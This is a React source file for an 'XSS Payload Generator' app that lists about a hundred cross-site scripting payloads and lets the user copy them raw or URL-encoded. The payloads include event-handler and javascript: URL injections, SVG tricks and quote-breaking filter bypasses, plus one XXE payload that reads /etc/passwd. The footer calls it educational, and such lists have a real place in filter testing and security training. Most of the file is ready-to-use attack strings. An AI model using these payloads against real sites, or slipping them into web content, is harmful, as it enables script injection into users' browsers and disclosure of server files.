import React, { useState } from 'react';

const App = () => {
  const [payloadName, setPayloadName] = useState('');
  const [payload, setPayload] = useState('');
  const [encodedPayload, setEncodedPayload] = useState('');

  const payloads = {
    'basic': '<script>alert("XSS")</script>',
    'img': '<img src=x onerror=alert("XSS")>',
    'href': '<a href="javascript:alert(\'XSS\')">Click me</a>',
    'input': '<input type="text" value="XSS" />',
    'body': '<body onload=alert("XSS")>',
    'iframe': '<iframe src="javascript:alert(\'XSS\');"></iframe>',
    'svg': '<svg onload=alert("XSS")>',
    'marquee': '<marquee onstart=alert("XSS")>',
    'video': '<video><source onerror="alert(\'XSS\')"></video>',
    'audio': '<audio src onerror="alert(\'XSS\')">',
    'base': '<base href="javascript:alert(\'XSS\');">',
    'form': '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
    'img-src': '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">',
    'button': '<button onclick="alert(\'XSS\')">Click me</button>',
    'style': '<style>*{xss:expression(alert(\'XSS\'))}</style>',
    'embed': '<embed src="javascript:alert(\'XSS\');">',
    'object': '<object data="javascript:alert(\'XSS\');"></object>',
    'meta': '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\');">',
    'script': '<script src="data:text/javascript,alert(\'XSS\');"></script>',
    'blink': '<blink onmouseover="alert(\'XSS\')">Hover me</blink>',
    'link': '<link rel="stylesheet" href="javascript:alert(\'XSS\');">',
    'comment': '<!--<script>alert(\'XSS\')</script>-->',
    'noscript': '<noscript><p title="</noscript><script>alert(1)</script>">',
    'math': '<math href="javascript:alert(1)">CLICKME</math>',
    'details': '<details open ontoggle=alert(1)>XSS</details>',
    'plaintext': '<plaintext><script>alert(1)</script>',
    'list': '<li onclick="alert(1)">XSS</li>',
    'svg-animate': '<svg><animate onbegin=alert(1) attributeName=x dur=1s></animate>',
    'svg-set': '<svg><set onbegin=alert(1) attributeName=x></set>',
    'svg-desc': '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>',
    'svg-title': '<svg><title><![CDATA[</title><script>alert(1)</script>]]></svg>',
    'iframe-data': '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
    'xml': '<?xml version="1.0" ?><svg><script>alert(1)</script></svg>',
    'canvas': '<canvas onmousemove=alert(1)>XSS</canvas>',
    'applet': '<applet code="javascript:alert(1);"></applet>',
    'img-dynsrc': '<img dynsrc="javascript:alert(1)">',
    'img-lowsrc': '<img lowsrc="javascript:alert(1)">',
    'keygen': '<keygen autofocus onfocus=alert(1)>',
    'output': '<output onload=alert(1)>XSS</output>',
    'progress': '<progress value=100 onmouseover=alert(1)>',
    'meter': '<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>',
    'bgsound': '<bgsound src="javascript:alert(1)">',
    'isindex': '<isindex action="javascript:alert(1)">',
    'xss': '<xss id=x tabindex=1 onactivate=alert(1)>',
    'animate': '<animate onbegin=alert(1) attributeName=x dur=1s>',
    'animateMotion': '<animateMotion onbegin=alert(1) attributeName=x dur=1s>',
    'animateTransform': '<animateTransform onbegin=alert(1) attributeName=x dur=1s>',
    'feImage': '<feImage href="javascript:alert(1)">',
    'image': '<image href="javascript:alert(1)">',
    'mpath': '<mpath href="javascript:alert(1)">',
    'set': '<set attributeName="onmouseover" to="alert(1)">',
    'unknown-element': '<unknown onmouseover=alert(1)>XSS</unknown>',
    'xml-stylesheet': '<?xml-stylesheet href="javascript:alert(1)"?>',
    'xml-comment': '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
    'iframe-png': '<iframe src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAIAAABQZ2zoAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH5QMFBCciFC9eyQAAAAlwSFlzAAALEwAACxMBAJqcGAAAABl0RVh0Q29tbWVudABDcmVhdGVkIHdpdGggR0lNUFeBDhcAAAANSURBVAjXY/j//z8DPYAJDAAEcQEGgDp5cAAAAAElFTkSuQmCC">',
    'svg-img': '<svg><image href="javascript:alert(1)"></svg>',
    'foreignObject': '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload="alert(1)"></body></foreignObject></svg>',
    'filter': '<svg><filter><feGaussianBlur in="SourceGraphic" stdDeviation="1" onmouseover="alert(1)" /></filter></svg>',
    'clippath': '<svg><clippath id="x"><image width="100" height="100" href="javascript:alert(1)"/></clippath></svg>',
    'marker': '<svg><marker id="x" markerWidth="10" markerHeight="10" refX="5" refY="5"><circle cx="5" cy="5" r="5" style="fill: #000;"/><animate attributeName="r" from="5" to="50" dur="5s" repeatCount="indefinite" onbegin="alert(1)"/></marker></svg>',
    'pattern': '<svg><pattern id="x" width="100" height="100" patternUnits="userSpaceOnUse"><rect width="100" height="100" style="fill: #000;"/><animate attributeName="x" from="0" to="100" dur="5s" repeatCount="indefinite" onbegin="alert(1)"/></pattern></svg>',
    'switch': '<svg><switch><g requiredExtensions="http://www.w3.org/1999/xhtml" systemLanguage="en"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload="alert(1)"></body></foreignObject></g></switch></svg>',
    'altGlyph': '<svg><altGlyph xlink:href="javascript:alert(1)"/></svg>',
    'altGlyphDef': '<svg><altGlyphDef><glyphRef xlink:href="javascript:alert(1)"/></altGlyphDef></svg>',
    'altGlyphItem': '<svg><altGlyphItem><glyphRef xlink:href="javascript:alert(1)"/></altGlyphItem></svg>',
    'glyphRef': '<svg><glyphRef xlink:href="javascript:alert(1)"/></svg>',
    'cursor': '<svg><cursor xlink:href="javascript:alert(1)"/></svg>',
    'a': '<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a></svg>',
    'view': '<svg><view xlink:href="javascript:alert(1)"/></svg>',
    'color-profile': '<svg><color-profile xlink:href="javascript:alert(1)"/></svg>',
    'script-onload': '<script onload="alert(1)"></script>',
    'meta-onfocus': '<meta onfocus="alert(1)" content="text/html; charset=utf-8">',
    'form-action': '<form action="javascript:alert(1)"><input type="submit" /></form>',
    'plaintext-element': '<plaintext><script>alert(1)</script>',
    'xlink': '<a xlink:href="javascript:alert(1)">XSS</a>',
    'xlink-href': '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)">XSS</a></svg>',
    'xmlns-xlink': '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)">XSS</a></svg>',
    'xmlns': '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)">XSS</a></svg>',
    'link-rel': '<link rel="stylesheet" href="javascript:alert(\'XSS\');">',
    'link-href': '<link href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">',
    'link-import': '<link rel="import" href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">',
    'style-onload': '<style onload="alert(1)"></style>',
    'base-href': '<base href="javascript:alert(\'XSS\');">',
    'meta-refresh': '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\');">',
    'iframe-data': '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>',
    'iframe-html': '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
    'plaintext-tag': '<plaintext><script>alert(1)</script>',
    'noscript-tag': '<noscript><p title="</noscript><script>alert(1)</script>">',
    'xss-tag': '<xss id=x tabindex=1 onactivate=alert(1)>',
    'xml-version': '<?xml version="1.0" ?><svg><script>alert(1)</script></svg>',
    // Additional payloads including bypass techniques
    'top': ';alert(String.fromCharCode(88,83,83))//',
    'single-quote': "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\"'>" + "><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
    'double-quote': '";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
    'no-tag': `'"--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>'`,
    '0': '"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)">" -confirm(3)-'
  };

  const generatePayload = (name) => {
    const payload = payloads[name];
    if (payload) {
      setPayload(payload);
      setEncodedPayload(encodeURIComponent(payload));
    } else {
      setPayload('');
      setEncodedPayload('');
    }
  };

  const handleCopy = (text) => {
    navigator.clipboard.writeText(text).then(() => {
      alert('Payload copied to clipboard!');
    });
  };

  return  (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gray-800 p-4 border-2 border-gray-700 shadow-lg rounded-lg">
      <h1 className="text-2xl font-bold mb-4 text-green-500">XSS Payload Generator</h1>
      <select
        value={payloadName}
        onChange={(e) => setPayloadName(e.target.value)}
        className="mb-4 p-2 border rounded"
      >
        <option value="">Select a payload</option>
        {Object.keys(payloads).map((key) => (
          <option key={key} value={key}>{key}</option>
        ))}
      </select>
      <button
        onClick={() => generatePayload(payloadName)}
        className="mb-4 px-4 py-2 bg-blue-500 text-white rounded"
      >
        Generate Payload
      </button>
      {payload && (
        <div className="w-full max-w-md border border-gray-300 shadow-md rounded-lg mb-4 bg-slate-700">
          <div className="mb-2">
            <label className="block font-bold text-white">Payload:</label>
            <div className="overflow-auto max-h-40 bg-white p-2 border rounded">{payload}</div>
            <div className="flex justify-center"> {/* Center aligns the button */}
              <button
                onClick={() => handleCopy(payload)}
                className="mt-2 px-4 py-2 bg-green-500 text-white rounded"
              >
                Copy Payload
              </button>
            </div>
          </div>
          <div>
            <label className="block font-bold text-white">Encoded Payload:</label>
            <div className="overflow-auto max-h-40 bg-white p-2 border rounded">{encodedPayload}</div>
            <div className="flex justify-center"> {/* Center aligns the button */}
              <button
                onClick={() => handleCopy(encodedPayload)}
                className="mt-2 px-4 py-2 bg-green-500 text-white rounded"
              >
                Copy Encoded Payload
              </button>
            </div>
          </div>
        </div>
      )}
      <footer className="bg-yellow-500 text-center p-4 text-white border-t-2 border-gray-700">
        <div className="max-w-7xl mx-auto">
          <p className="text-sm">&copy; 2024 <a className='' href="https://rushikeshthakur.netlify.app/">Rushikesh Thakur. All rights reserved.</a></p>
          <p className="text-xs font-bold">This is an educational project. Use responsibly.</p>
        </div>
      </footer>
    </div>
  );
};

export default App;
